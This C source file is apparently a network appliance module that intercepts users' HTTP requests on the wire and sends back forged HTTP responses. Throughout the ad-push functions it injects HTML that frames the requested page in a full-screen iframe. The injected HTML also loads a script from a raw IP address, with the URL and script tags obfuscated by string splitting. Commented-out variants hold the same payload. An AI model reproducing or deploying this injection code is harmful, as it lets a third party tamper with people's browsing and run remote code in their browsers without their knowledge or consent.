#include "boots.h"
#include "bts_debug.h"
#include "bts_cnt.h"

#include "naga_types.h"
#include "nag_adp.h"
#include "itf.h"
#include "packet.h"
#include "packet_http.h"
#include "adp_cmd.h"
#include "user_control.h"


#define DEBUG
#ifdef  DEBUG   
#define debug(fmt,args...)  printf ("func(%s), line(%d)"fmt"\n" ,__FUNCTION__, __LINE__, ##args)
#else   
#define debug(fmt,args...)   
#endif  /* DEBUG */ 

//uint64_t  g_adp_cnt = 0;
uint64_t  g_adp_interval = 1;
//uint64_t  g_adp_success=0;

int  g_adp_push_switch = 1;

int  g_adp_push_temp_pc_switch = 1;
int  g_adp_push_temp_mobile_switch = 0;

berr adp_switch_set(int on)
{
    g_adp_push_switch = on; 
    return E_SUCCESS;
}



berr adp_switch_get(int *on)
{
    *on = g_adp_push_switch ; 
    return E_SUCCESS;
}


berr adp_switch_template_set(int type, int on)
{
    switch(type)
    {
        case AD_TEMPLATE_MOBILE   :
            g_adp_push_temp_mobile_switch = on;
            break;
        case AD_TEMPLATE_PC :  
            g_adp_push_temp_pc_switch = on; 
            break;
         default:
            return E_FAIL;
    }
    return E_SUCCESS;
}



berr adp_switch_template_get(int type, int *on)
{
    switch(type)
    {
        case AD_TEMPLATE_MOBILE   :
            *on = g_adp_push_temp_mobile_switch;
            break;
        case AD_TEMPLATE_PC :  
            *on = g_adp_push_temp_pc_switch; 
            break;
         default:
            return E_FAIL;
    }
    return E_SUCCESS;
}




berr adp_set_interval(int interval)
{
    g_adp_interval = interval;
    return E_SUCCESS;
}

berr adp_get_interval(int *interval)
{
    *interval = g_adp_interval ;
    //*adp_cnt =  CNT_GET(ADP_ALL_CAN_PUSH);
    //*success = CNT_GET(ADP_PUSH_TX_SUCCESS);
    return E_SUCCESS;
}

berr adp_clear_interval(void)
{
	CNT_SET(ADP_ALL_CAN_PUSH, 0);
	CNT_SET(ADP_PUSH_TX_SUCCESS, 0);
	CNT_SET(ADP_PUSH_ACK_SUCCESS, 0);	
    return E_SUCCESS;
}


extern struct rte_mempool * l2fwd_pktmbuf_pool;

static inline struct rte_mbuf *rte_pktmbuf_real_clone(struct rte_mbuf *md,
    struct rte_mempool *mp)
{
  struct rte_mbuf *mc;
  if (unlikely ((mc = rte_pktmbuf_alloc(mp)) == NULL))
    return (NULL);
  /* copy data */
  rte_memcpy((void *)mc, (void *)md, (size_t) mp->elt_size);

  /* update the addr */
  mc->buf_addr = (char *)mc + sizeof(struct rte_mbuf);
  mc->buf_physaddr = rte_mempool_virt2phy(mp, mc) +
      sizeof(struct rte_mbuf);
  __rte_mbuf_sanity_check(mc, 1);

  /* dump */
#if 0
  printf("old mbuf:\n");
  rte_pktmbuf_dump(stdout, md, md->pkt_len);
  printf("new mbuf:\n");
  rte_pktmbuf_dump(stdout, mc, mc->pkt_len);
#endif
  return (mc);
}



berr naga_adp_new(hytag_t *hytag)
{
	int l =0;
	uint8_t bufferp[2048];
	uint8_t *buffer = bufferp;
	
    if(( NULL == hytag) /*|| (NULL == hytag->m)*/)
    {
        CNT_INC(ADP_DROP_PARAM);
        BRET(E_PARAM);
    }

    /* */
    if( APP_TYPE_HTTP_GET_OR_POST != hytag->app_type)
    {
        CNT_INC(ADP_DROP_GET_OR_POST);
        return E_SUCCESS;
    }


	if(ACT_DROP == (hytag->acl.actions & ACT_DROP))
	{
       	CNT_INC(ADP_DROP_ACT_DROP);
        return E_SUCCESS;
	}
    
	if(0 == (hytag->acl.actions & ACT_PUSH))
	{
       	CNT_INC(ADP_DROP_ACT_PUSH);
        return E_SUCCESS;
	}


	if(hytag->uri_len > 1024)
	{
		CNT_INC(ADP_DROP_URI_OVERFLOW);
		return E_SUCCESS;
	}
	

  
	CNT_INC(ADP_ALL_CAN_PUSH);
	if(hytag->url_append == DISABLE)
	{

    	if(hytag->uri[0] == '/' && hytag->host_len > 0 && hytag->uri_len > 0)
    	{
        	hytag->url_len= snprintf(hytag->url, URL_MAX_LEN, "%s%s",
                                                hytag->host, hytag->uri);
			hytag->url_append = ENABLE;
    	}
	}

	if(!user_push_check(hytag))
	{
		 CNT_INC(ADP_DROP_ACT_INTERVAL);
		 return E_SUCCESS;
	}



    if (likely(!g_adp_push_switch))
    {
        return E_SUCCESS;
    }  




/*
 
replace : 
 
    "<script>\n"
    "d=document;\n"
    "function u(){\n"
    "var f = \"";
    
		
    "\";\n"
    "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';\n"
    "}\n"
    "</script>\n" 
 
to:
 
<script>
(function(w){var a7= w.a7 || {} ;var d=document;a7.u = function() 
{        var f = d.location.href;        d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'?')+'_t_t_t='+Math.random(); 
};w.a7 = a7;})(window);
</script>
<style> 
 
 
 
 
 
 
 ***************************************************************************
 
 
 <!DOCTYPE HTML>
<html>
<head>
<title></title>
<script type="text/javascript" src="http://www.pangolinnet.com/plug/witmenu/js/jquery.js"></script>
<script type="text/javascript" src="http://www.pangolinnet.com/plug/witmenu/js/datetable.js"></script>
<script> 
 
( 
function(w) 
{ 
    var a7= w.a7 || {} ;
    var d=document;
 
    a7.u = function() 
        {
            var f = d.location.href;
            document.write(f);
            alert(f);
//            d.getElementById("m").src=f+(f.indexOf("&")<0?'?':'?')+'_t_t_t='+Math.random();
        };
    w.a7 = a7;
 }
 )(window);
 
</script>
<style>
    body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}#i{display:block; position:absolute; z-index:1; width:100%; height:100%}
</style>
</head>
<body onLoad=a7.u()>
<div id='i'>
<iframe id='m' frameborder='0' width='100%' height='100%'></iframe>
</div>
<script type="text/javascript" src="http://www.pangolinnet.com/plug/witmenu/js/witmenu.js" charset="utf-8">

</script>
</body>
</html>
 
 
 
******************************************************************** 
 

    
    memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
    char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
        "Content-Length:"; 
    char tail[] = "\r\n"
        "Cache-Control: no-store, no-cache\r\n"
        "Connection: close\r\n\r\n";

    char body1[] = "<html>\n"
            "<head>\n"
            "<meta charset=\"utf-8\">\n"
            "<title></title>\n"
            "<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
            "<script type=\"text/javascript\" src=\"http://www.pangolinnet.com/plug/witmenu/js/jquery.js\"></script>\n"

            "<script>"
            "(function u(w){var a7= w.a7 || {} ;var d=document;a7.u = "
            "function() { "
            " var f = d.location.href;"
            " document.write(f);"
            " alert(f);"

            " d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0?'?':'?')+'_t_t_t='+Math.random();"
            " w.a7 = a7;})(window);"
            "</script>\n"

            "<style>\n"
            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
            "</style>\n"
            "</head>\n"
            "<body>\n"
            "<div id=i>\n"
            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
            "</div>\n"
            "<script>"
            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/php/ad.php';"
            "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');"
			"</script>\n"			
			"<script>"
			"$(function(){a7.u();});"	
			"</script>\n"	
			"</body>\n"
            "</html>\n";

    char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
    int contlen = sizeof(body1);
    l = snprintf(buffer_l5, 2048, "%s%d%s%s",
        head, contlen, tail, body1); 
 
*/

#if 0

	
	memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
	char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
		"Content-Length:"; 
	char tail[] = "\r\n"
		"Cache-Control: no-store, no-cache\r\n"
		"Connection: close\r\n\r\n";


	
	char body1[] = "<html>\n"
            "<head>\n"
            "<meta charset=\"utf-8\">\n"
            "<title></title>\n"
			"<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
			"<script>\n"
            "d=document;\n"
            "function u(){\n"
            "var f = \"";
            
		
	char body2[] = "\";\n"
            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';\n"
            "}\n"
            "</script>\n"
            "<style>\n"
            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
            "</style>\n"
            "</head>\n"
            "<body>\n"
            "<div id=i>\n"
            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
            "</div>\n"
            "<script>"
            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/php/ad.php';"
            "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');"
			"</script>\n"			
			"<script>"
			"$(function(){u();});"	
			"</script>\n"	
			"</body>\n"
            "</html>\n";
            


	char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
	int contlen = sizeof(body1) + sizeof(body2) + hytag->url_len + strlen("http://") - 1;
	l = snprintf(buffer_l5, 2048, "%s%d%s%shttp://%s%s",
		head, contlen, tail, body1, hytag->url,  body2);

#else 
    
    memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
    char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
        "Content-Length:"; 
    char tail[] = "\r\n"
        "Cache-Control: no-store, no-cache\r\n"
        "Connection: close\r\n\r\n";

    char body1[] = "<html>\n"
            "<head>\n"
            "<meta charset=\"utf-8\">\n"
            "<title></title>\n"
            "<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/1.7/jquery.min.js\"></script>\n"
            "<script type=\"text/javascript\" src=\"http://www.pangolinnet.com/plug/witmenu/js/jquery.js\"></script>\n"
            "<script>\n"
            "function u(){\n"
            "var d = document;\n"
            "var f = d.location.href;\n"
            "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_t=t\';}\n"
            "</script>\n"

            "<style>\n"
            "body{margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
            "#i{display:block;position:absolute;z-index:1;width:100%;height:100%}\n"
            "</style>\n"
            "</head>\n"
            "<body>\n"
            "<div id=i>\n"
            "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
            "</div>\n"
            "<script>\n"
            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/php/ad.php';\n"
            "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');\n"
			"</script>\n"			
			"<script>\n"
			"$(function(){u();});\n"
			"</script>\n"
			"</body>\n"
            "</html>";
            

    char * buffer_l5 = (char *)(buffer+ hytag->l5_offset);
    int contlen = sizeof(body1) - 1;
    l = snprintf(buffer_l5, 2048, "%s%d%s%s",
        head, contlen, tail, body1);

#endif

	int rv;
	rv = ads_response_packet_gen(buffer, hytag, l);

	 
	if(rv != E_SUCCESS)
	{
		CNT_INC(ADP_PUSH_GEN_FAILED);
		return rv;
	}
	
    hytag->data_len = hytag->l5_offset - hytag->l2_offset + hytag->l5_len;

	if(hytag->data_len > 1500)
	{
		CNT_INC(ADP_PUSH_GEN_FAILED);
		printf("packet overflow (%d)\n", hytag->data_len);
		return rv;
	}
	
    rv = ift_raw_send_packet(hytag->fp, buffer, (int)hytag->data_len);

	 //printf("datalen = %d\n", hytag->data_len);
	 //printf("string = %s\n",  buffer_l5);
     if(rv != E_SUCCESS)
     {
          printf("Send packet Failed\n");
          return rv;
     }	
	 CNT_INC(ADP_PUSH_TX_SUCCESS);
	 return E_SUCCESS;		
}





berr naga_adp(hytag_t *hytag)
{

    berr rv;
    //char *rear = NULL;
    struct rte_mbuf *txm = NULL;
    struct rte_mbuf *m = NULL;
	unsigned char buffer[2048]; 
    CNT_INC(ADP_IPKTS);

    if(( NULL == hytag) /*|| (NULL == hytag->m)*/)
    {
        CNT_INC(ADP_DROP_PARAM);
        BRET(E_PARAM);
    }

    /* */
    if( APP_TYPE_HTTP_GET_OR_POST != hytag->app_type)
    {
        CNT_INC(ADP_DROP_GET_OR_POST);
        return E_SUCCESS;
    }


	if(ACT_DROP == (hytag->acl.actions & ACT_DROP))
	{
       	CNT_INC(ADP_DROP_ACT_DROP);
        return E_SUCCESS;
	}
    
	if(0 == (hytag->acl.actions & ACT_PUSH))
	{
       	CNT_INC(ADP_DROP_ACT_PUSH);
        return E_SUCCESS;
	}
    if (likely(!g_adp_push_switch))
    {
        return E_SUCCESS;
    }    




#if 0
    if(NULL != strstr(hytag->uri, "?_t=t"))
    {
        CNT_INC(ADP_DROP_OUR_SUFFIX);
	    return E_SUCCESS;
    }
#endif
#if 0

	rear= strrchr(hytag->uri, '.');

	if(rear == NULL)
	{
	    if(hytag->uri_len == 1 && !strcmp(hytag->uri, "/"))
	    {
            
	    }						
	    else
	    {
            CNT_INC(ADP_DROP_BACKSLASH_SUFFIX);
			return E_SUCCESS;
        }							
	}
	else
	{
		return E_SUCCESS;
		if( strcmp(rear, ".html") &&  strcmp(rear, ".htm"))
		{
            CNT_INC(ADP_DROP_HTML_SUFFIX);
			return E_SUCCESS;
		}
		
	}
#endif

    if (likely(!g_adp_push_switch))
    {
        return E_SUCCESS;
    }    




#if 1
    /*check The First char*/
	if(hytag->uri[0] == '/' && hytag->host_len > 0 && hytag->uri_len > 0)
	{
		hytag->url_len= snprintf(hytag->url, URL_MAX_LEN, "http://%s%s",
                                                hytag->host, hytag->uri);
	}
#endif

    txm = hytag->m;


	
    if( strstr(hytag->user_agent, "Phone") 
        || strstr(hytag->user_agent, "Android")
        //|| strstr(hytag->user_agent, "BlackBerry")
        //|| strstr(hytag->user_agent, "SymbianOS")
        || strstr(hytag->user_agent, "iPad")
        )
    {
        if(likely(g_adp_push_temp_mobile_switch))
        {		  
 		    hytag->template = AD_TEMPLATE_MOBILE;
		    CNT_INC(ADP_PUSH_MOBILE);
        }
        else
        {
            CNT_INC(ADP_DROP_PUSH_MOBILE);
            return E_SUCCESS;           
        }
        
    }
	
    else if(
        strstr(hytag->user_agent, "MSIE")
       || strstr(hytag->user_agent, "Windows")
       ||strstr(hytag->user_agent, "Chrome")
       || strstr(hytag->user_agent, "Macintosh")
       )
    {
        if(likely(g_adp_push_temp_pc_switch))
        {
		    hytag->template = AD_TEMPLATE_PC;
		    CNT_INC(ADP_PUSH_PC);
        }
        else
        {
            CNT_INC(ADP_DROP_PUSH_PC);
            return E_SUCCESS;
        }   
    }
    else
    {
        if(likely(g_adp_push_temp_mobile_switch))
        {		  
 		    hytag->template = AD_TEMPLATE_MOBILE;
		    CNT_INC(ADP_PUSH_MOBILE);
        }
        else
        {
            CNT_INC(ADP_DROP_PUSH_MOBILE);
            return E_SUCCESS;           
        }
    }

	CNT_INC(ADP_ALL_CAN_PUSH);
    if( CNT_GET(ADP_ALL_CAN_PUSH)% g_adp_interval != 0)
    {
        CNT_INC(ADP_DROP_ADP_INTERVAL);
        return E_SUCCESS;
    }

	
	CYCLE_INIT(1);

    if(hytag->eth_tx == ENABLE)
    {
		CYCLE_START();

		
	    memcpy(buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
		rv = ads_response_head_generator(buffer, hytag);
		
		if(rv != E_SUCCESS) {
			CNT_INC(ADP_DROP_HEAD_GEN1);
				return rv;
		}

 		CYCLE_END();

    	CYCLE_START();
        rv = ift_raw_send_packet(hytag->fp, buffer, hytag->data_len);
        if(rv != E_SUCCESS)
        {
            printf("Send packet Failed\n");
            CNT_INC(ADP_DROP_SEND_PACKET1);
            return rv;
        }
		CYCLE_END();
   }  
   else
    {

    	    rv = ads_response_head_generator(hytag->pbuf.ptr, hytag);
    		if(rv != E_SUCCESS) {
    			CNT_INC(ADP_DROP_HEAD_GEN1);
    			return rv;
    		}

         	txm->data_len = txm->pkt_len = hytag->data_len;
            itf_send_packet_imm(txm, txm->port);

    }
        

      
    if( adt_send_is_multi())
    {
    
#if USE_D_PACKET
#define CONTENT_FILL_LEN_MAX 1400
            hytag->content_offset = 0;
            /*
               debug("hytag->content_len(%d), hytag->content_offset(%d), hytag->fill_len(%d)", 
               hytag->content_len, hytag->content_offset, hytag->fill_len);
               */
            //usleep(10);

            if(hytag->eth_tx == ENABLE)
            {
                while ( hytag->content_offset < hytag->content_len)
                {

                    if ( hytag->content_len - hytag->content_offset >= CONTENT_FILL_LEN_MAX)
                    {
                        hytag->fill_len = CONTENT_FILL_LEN_MAX;
                    }
                    else
                    {
                        hytag->fill_len = hytag->content_len - hytag->content_offset;
                    }
					CYCLE_START();
                    rv = ads_response_content_generator(buffer, hytag);
					
                    if(rv != E_SUCCESS){

                        CNT_INC(ADP_DROP_HEAD_GEN2);
                        return rv;
                    }
					CYCLE_END();

					CYCLE_START();

                    hytag->content_offset += hytag->fill_len;
                    rv = ift_raw_send_packet(hytag->fp, buffer, hytag->data_len);

                    if(rv != E_SUCCESS)
                    {
                        CNT_INC(ADP_DROP_SEND_PACKET2);
                        printf("Send packet Failed\n");
                        return rv;
                    }
					CYCLE_END();

                }
            }
            else
            {
                while ( hytag->content_offset < hytag->content_len)
                {
                    m = txm;
                   
                    txm =rte_pktmbuf_real_clone(txm, txm->pool);
                    if ( NULL == txm )
                    {
                        printf("Requse packet buffer  Failed\n");
                        return E_SUCCESS;
                    }
                    txm->port = m->port;
                    if ( hytag->content_offset)
                    {
                        rte_pktmbuf_free(m);
                    }

                    if ( hytag->content_len - hytag->content_offset >= CONTENT_FILL_LEN_MAX)
                    {
                        hytag->fill_len = CONTENT_FILL_LEN_MAX;
                    }
                    else
                    {
                        hytag->fill_len = hytag->content_len - hytag->content_offset;
                    }

                    rv = ads_response_content_generator(rte_pktmbuf_mtod(txm, void *), hytag);
                    if(rv != E_SUCCESS){

                        CNT_INC(ADP_DROP_HEAD_GEN2);
                        return rv;
                    }

                    txm->data_len = txm->pkt_len = hytag->data_len;

                    hytag->content_offset += hytag->fill_len;

                    itf_send_packet_imm(txm, txm->port);
                }

                rte_pktmbuf_free(txm);

            }
    #endif
        }
       //g_adp_success++;
   hytag->ad_act = AD_SUCCESS;


   CNT_INC(ADP_PUSH_TX_SUCCESS);
   return E_SUCCESS;

}




time_t   adp_timep; 
berr adp_dp_init(void)
{   
   //berr rv; 
   //cmdline_adp_init();
   time(&adp_timep);    
   return E_SUCCESS;
}

time_t *adp_get_start_time(void)
{
    return   &adp_timep;
}

